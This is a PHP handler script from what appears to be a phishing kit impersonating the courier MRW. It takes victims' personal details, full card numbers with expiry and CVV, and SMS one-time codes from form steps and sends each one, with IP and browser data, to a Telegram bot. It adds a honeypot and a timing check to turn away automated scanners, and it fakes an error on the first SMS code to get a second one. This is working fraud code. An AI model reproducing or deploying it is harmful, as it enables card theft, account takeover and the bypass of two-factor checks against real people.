<?php
require_once __DIR__ . '/../config/config.php';

function sendMessage($message) {
    $url = "https://api.telegram.org/bot" . BOT_TOKEN . "/sendMessage";
    $data = [
        'chat_id' => CHAT_ID,
        'text' => $message,
        'parse_mode' => 'HTML'
    ];

    $options = [
        'http' => [
            'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
            'method'  => 'POST',
            'content' => http_build_query($data),
        ],
    ];
    $context  = stream_context_create($options);
    return file_get_contents($url, false, $context);
}

function getIP() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        return $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        return $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else {
        return $_SERVER['REMOTE_ADDR'];
    }
}

if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $step = $_POST['step'] ?? '';
    
    // Smart Invisible Protection (Honeypot & Time-check)
    if ($step == 'index_visit' || $step == 'billing') {
        $hp_field = $_POST['hp_field'] ?? '';
        $load_time = $_POST['load_time'] ?? 0;
        $current_time = time();
        $time_diff = $current_time - $load_time;

        // 1. Honeypot: If the hidden field is filled, it's a bot
        // 2. Time-check: If form submitted in less than 2 seconds, it's likely a bot
        if (!empty($hp_field) || $time_diff < 2) {
            // Silently redirect or log as bot without showing error to avoid tipping off bot creators
            header("Location: index");
            exit();
        }
    }

    $ip = getIP();
    $userAgent = $_SERVER['HTTP_USER_AGENT'];
    
    $message = "<b>🚀 New MRW Log [Step: $step]</b>\n";
    $message .= "<b>📍 IP:</b> <code>$ip</code>\n";
    $message .= "<b>🌐 Browser:</b> <code>$userAgent</code>\n\n";

    if ($step == 'index_visit') {
        $message .= "<b>👤 User clicked Continuar on Index Page</b>\n";
        sendMessage($message);
        header("Location: vdn");
        exit();
    } elseif ($step == 'resend_sms') {
        $message .= "<b>🔄 User requested to Resend SMS</b>\n";
        sendMessage($message);
        header("Location: sms");
        exit();
    } elseif ($step == 'billing') {
        $message .= "<b>👤 Name:</b> " . ($_POST['fname'] ?? 'N/A') . "\n";
        $message .= "<b>🏠 Address:</b> " . ($_POST['address1'] ?? 'N/A') . "\n";
        $message .= "<b>🏢 Details:</b> " . ($_POST['address2'] ?? 'N/A') . "\n";
        $message .= "<b>🏙️ City:</b> " . ($_POST['city'] ?? 'N/A') . "\n";
        $message .= "<b>🌍 State:</b> " . ($_POST['country'] ?? 'N/A') . "\n";
        $message .= "<b>📮 ZIP:</b> " . ($_POST['zip'] ?? 'N/A') . "\n";
        $message .= "<b>📧 Email:</b> " . ($_POST['email'] ?? 'N/A') . "\n";
        $message .= "<b>📞 Phone:</b> " . ($_POST['number'] ?? 'N/A') . "\n";
        
        sendMessage($message);
        header("Location: aro");
        exit();

    } elseif ($step == 'cc') {
        $message .= "<b>💳 Holder:</b> " . ($_POST['fname'] ?? 'N/A') . "\n";
        $message .= "<b>🔢 Card:</b> <code>" . ($_POST['card'] ?? 'N/A') . "</code>\n";
        $message .= "<b>📅 Exp:</b> " . ($_POST['date'] ?? 'N/A') . "\n";
        $message .= "<b>🔒 CVV:</b> <code>" . ($_POST['cvv'] ?? 'N/A') . "</code>\n";
        
        sendMessage($message);
        header("Location: arn");
        exit();

    } elseif ($step == 'sms') {
        $sms_attempt = $_POST['attempt'] ?? '1';
        $sms_code = $_POST['sms'] ?? 'N/A';
        
        if ($sms_attempt == '1') {
            $message = "<b>❌ SMS Attempt 1 (Error)</b>\n";
            $message .= "<b>📍 IP:</b> <code>$ip</code>\n";
            $message .= "<b>💬 Code:</b> <code>$sms_code</code>\n";
            sendMessage($message);
            header("Location: sms?error=1");
            exit();
        } else {
            $message = "<b>✅ SMS Attempt 2 (Success)</b>\n";
            $message .= "<b>📍 IP:</b> <code>$ip</code>\n";
            $message .= "<b>💬 Code:</b> <code>$sms_code</code>\n";
            sendMessage($message);
            header("Location: tmz");
            exit();
        }
    }
} else {
    header("Location: index");
    exit();
}
?>
